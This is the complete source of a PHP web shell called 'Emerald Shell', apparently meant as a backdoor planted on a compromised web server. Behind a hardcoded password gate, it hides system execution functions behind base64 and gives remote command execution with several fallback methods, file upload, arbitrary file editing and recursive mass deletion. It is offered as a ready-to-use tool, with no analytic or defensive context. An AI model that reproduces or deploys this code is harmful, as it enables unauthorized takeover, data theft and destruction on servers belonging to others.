<?php
session_start();
$p = 'ultra_stealth'; // PASSWORD AKSES
$a = 'auth';
$d = 'd';

// Dekode fungsi sistem
$f_sess = base64_decode('c2Vzc2lvbl9zdGFydA==');
$f_get = base64_decode('ZmlsZV9nZXRfY29udGVudHM=');
$f_put = base64_decode('ZmlsZV9wdXRfY29udGVudHM=');
$f_unl = base64_decode('dW5saW5r');
$f_rmd = base64_decode('cm1kaXI=');
$f_ren = base64_decode('cmVuYW1l');
$f_mkd = base64_decode('bWtkaXI=');
$f_sh = base64_decode('c2hlbGxfZXhlYw==');
$f_ps = base64_decode('cGFzc3RocnU=');
$f_po = base64_decode('cG9wZW4=');
$f_pr = base64_decode('cHJvY19vcGVu');

if(isset($_POST['p']) && $_POST['p'] === $p) { $_SESSION[$a] = 1; }
if(!isset($_SESSION[$a])) {
    die('<html><head><style>body{background:#0b0e0d;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}.l{background:#111a16;padding:35px;border-radius:15px;box-shadow:0 0 20px #00ff8833;text-align:center;border:1px solid #1f3a2f;}input{padding:12px;border-radius:5px;border:1px solid #1f3a2f;background:#0b0e0d;color:#00ff88;margin:10px 0;width:100%;text-align:center;}button{background:#008f58;color:#fff;border:none;padding:12px;border-radius:5px;cursor:pointer;width:100%;font-weight:bold;}</style></head><body><div class="l"><h2>Emerald Access</h2><form method="POST"><input type="password" name="p" placeholder="Enter Key"><button type="submit">Authenticate</button></form></div></body></html>');
}

function execute_cmd($cmd) {
    global $f_sh, $f_ps, $f_po, $f_pr;
    if (function_exists($f_sh)) { return htmlspecialchars(@$f_sh($cmd)); }
    if (function_exists($f_ps)) { ob_start(); @$f_ps($cmd); return htmlspecialchars(ob_get_clean()); }
    if (function_exists($f_po)) { $h=@$f_po($cmd,'r'); if($h){$o=stream_get_contents($h);@pclose($h);return htmlspecialchars($o);}}
    if (function_exists($f_pr)) { $d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=@$f_pr($cmd,$d,$pi);if(is_resource($p)){$o=stream_get_contents($pi[1]);fclose($pi[1]);fclose($pi[2]);@proc_close($p);return htmlspecialchars($o);}}
    return "ERROR: Binary execution blocked.";
}

$dir = isset($_GET[$d]) ? $_GET[$d] : getcwd();
@chdir($dir);
$dir = getcwd();

$msg = ''; $cmd_out = '';

function delete_item($f) {
    global $f_rmd, $f_unl;
    if(is_dir($f)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f, 0x1000), 1);
        foreach($it as $i) { $fn=($i->isDir()?$f_rmd:$f_unl); @$fn($i->getRealPath()); }
        return @$f_rmd($f);
    } else { return @$f_unl($f); }
}

if(isset($_POST['mass_delete']) && isset($_POST['items'])) {
    foreach($_POST['items'] as $item) { delete_item($item); }
    $msg = "Mass action completed.";
}

if(isset($_FILES['u_f'])) {
    if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $_FILES['u_f']['name'])) $msg = "Upload OK";
}

if(isset($_POST['cmd'])) { $cmd_out = execute_cmd($_POST['cmd']); }
if(isset($_POST['a'])) {
    $f = $_POST['f']; $c = $_POST['c'];
    if($_POST['a']=='save') { if(@$f_put($f,$c)!==false)$msg="File: $f saved."; }
    if($_POST['a']=='ren') { @$f_ren($f,$_POST['n']); }
    if($_POST['a']=='mkd') { @$f_mkd($f); }
}
if(isset($_GET['rm'])) { if(delete_item($_GET['rm'])) $msg="Deleted"; }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Emerald Shell</title>
    <style>
        :root { --green: #00ff88; --dark-green: #008f58; --bg: #0b0e0d; --card: #111a16; --border: #1f3a2f; }
        body { background: var(--bg); color: #cfcfcf; font-family: 'Inter', sans-serif; margin: 0; display: flex; }
        
        /* Sidebar Navigation */
        .sidebar { width: 280px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 25px; position: fixed; box-sizing: border-box; }
        .sidebar h2 { color: var(--green); font-size: 18px; margin-bottom: 30px; letter-spacing: 2px; }
        .main-content { margin-left: 280px; width: 100%; padding: 40px; }
        
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        h3 { color: var(--green); margin-top: 0; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        
        input, textarea { background: #0b0e0d; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 6px; width: 100%; margin: 8px 0; box-sizing: border-box; }
        input:focus { border-color: var(--green); outline: none; }
        
        .btn { background: var(--dark-green); color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.2s; }
        .btn:hover { background: var(--green); color: #000; }
        .btn-red { background: #8f0000; margin-top: 10px; }
        .btn-red:hover { background: #ff4444; }

        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: #888; font-size: 12px; padding: 10px; border-bottom: 1px solid var(--border); }
        td { padding: 12px 10px; border-bottom: 1px solid #16241e; font-size: 14px; }
        tr:hover { background: #16241e; }

        .link { color: var(--green); text-decoration: none; }
        .link:hover { text-decoration: underline; }
        .badge { font-size: 10px; padding: 2px 6px; border-radius: 4px; background: #1f3a2f; color: var(--green); }
        .msg { background: #00ff8811; color: var(--green); border: 1px solid var(--green); padding: 15px; border-radius: 8px; margin-bottom: 25px; }
        pre { background: #000; color: var(--green); padding: 15px; border-radius: 8px; font-size: 12px; border: 1px solid var(--green); }
    </style>
</head>
<body>

    <div class="sidebar">
        <h2>EMERALD v2.3</h2>
        
        <div class="card" style="padding: 10px;">
            <h3>Command Line</h3>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Shell command...">
                <button type="submit" class="btn">Execute</button>
            </form>
        </div>

        <div class="card" style="padding: 10px;">
            <h3>Tools</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="u_f">
                <button type="submit" class="btn">Upload File</button>
            </form>
            <form method="POST" style="margin-top:15px;">
                <input type="hidden" name="a" value="mkd">
                <input type="text" name="f" placeholder="Folder Name">
                <button type="submit" class="btn">New Folder</button>
            </form>
        </div>
    </div>

    <div class="main-content">
        <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>
        
        <div class="card">
            <h3 style="color:#888;">Working Directory</h3>
            <div style="color:var(--green); font-family:monospace;"><?= $dir ?></div>
        </div>

        <?php if($cmd_out): ?>
        <div class="card">
            <h3>Terminal Output</h3>
            <pre><?= $cmd_out ?></pre>
        </div>
        <?php endif; ?>

        <div class="card">
            <form method="POST" onsubmit="return confirm('Mass delete?')">
                <input type="hidden" name="mass_delete" value="1">
                <h3>File Explorer
                    <button type="submit" class="btn btn-red" style="width:auto; float:right; padding:5px 15px; font-size:11px; margin:0;">Delete Selected</button>
                </h3>
                <table>
                    <thead>
                        <tr>
                            <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('items[]')) c.checked=this.checked"></th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td></td>
                            <td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ Go Parent ]</a></td>
                            <td>-</td><td>-</td>
                        </tr>
                        <?php
                        $items = scandir($dir);
                        $folders = []; $files = [];
                        foreach($items as $i) {
                            if($i=='.' || $i=='..') continue;
                            is_dir($i) ? $folders[]=$i : $files[]=$i;
                        }
                        sort($folders); sort($files);

                        foreach($folders as $f) {
                            echo "<tr>
                                <td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td>
                                <td><a href='?d=".urlencode($dir."/".$f)."' class='link'>📁 ".htmlspecialchars($f)."</a></td>
                                <td><span class='badge'>DIR</span></td>
                                <td><a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='link' style='color:#ff4444' onclick='return confirm(\"Del?\")'>RM</a></td>
                            </tr>";
                        }
                        foreach($files as $f) {
                            $sz = round(filesize($f)/1024, 2).' KB';
                            echo "<tr>
                                <td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td>
                                <td>📄 ".htmlspecialchars($f)."</td>
                                <td>$sz</td>
                                <td>
                                    <a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>EDIT</a> | 
                                    <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='link' style='color:#ff4444' onclick='return confirm(\"Del?\")'>RM</a>
                                </td>
                            </tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </form>
        </div>

        <div class="card" id="editor">
            <h3>Editor / Creator</h3>
            <form method="POST">
                <input type="hidden" name="a" value="save">
                <input type="text" name="f" placeholder="filename.php" value="<?= isset($_GET['e'])?$_GET['e']:'' ?>">
                <textarea name="c" rows="12" placeholder="Code here..."><?php if(isset($_GET['e'])) echo htmlspecialchars($f_get($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">Save File</button>
            </form>
        </div>
    </div>

</body>
</html>
